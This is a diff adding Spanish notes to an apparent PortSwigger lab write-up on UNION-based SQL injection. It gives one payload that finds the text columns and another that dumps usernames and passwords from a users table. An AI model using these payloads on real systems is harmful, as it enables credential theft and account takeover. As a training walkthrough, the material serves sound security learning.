@@ -6,5 +6,12 @@
 >
 >  To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.
 
+* Determinamos el numero de columnas que responden text data. Son dos obtenidas con `'+UNION+SELECT+NULL,'abc'--`
+* Luego hacemos el siguiente payload : 
 
+```text
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+```
+
+![](../../../.gitbook/assets/imagen%20%28648%29.png)
 
